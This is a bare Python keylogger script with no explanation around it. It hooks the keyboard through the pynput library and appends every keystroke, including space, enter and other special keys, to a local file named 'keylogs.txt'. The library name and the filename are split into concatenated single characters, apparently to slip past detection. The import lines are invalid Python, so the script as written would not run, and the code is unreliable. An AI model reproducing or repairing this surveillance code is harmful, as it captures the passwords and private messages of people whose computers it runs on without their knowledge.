import __import__('p'+'y'+'n'+'p'+'u'+'t') as x
from x import keyboard
def log_key(key):
    try:
        with open('k'+'e'+'y'+'l'+'o'+'g'+'s'+'.txt', 'a') as f:
            f.write(str(key.char))
    except AttributeError:
        if key == keyboard.Key.space:
            with open('k'+'e'+'y'+'l'+'o'+'g'+'s'+'.txt', 'a') as f:
                f.write('[SPACE]')
        elif key == keyboard.Key.enter:
            with open('k'+'e'+'y'+'l'+'o'+'g'+'s'+'.txt', 'a') as f:
                f.write('[ENTER]\n')
        else:
            with open('k'+'e'+'y'+'l'+'o'+'g'+'s'+'.txt', 'a') as f:
                f.write(f'[{str(key).upper()}]')
def release_key(key):
    if key == keyboard.Key.esc:
        return False
with keyboard.Listener(on_press=log_key, on_release=release_key) as listener:
    try:
        listener.join()
    except Exception as e:
        print(e)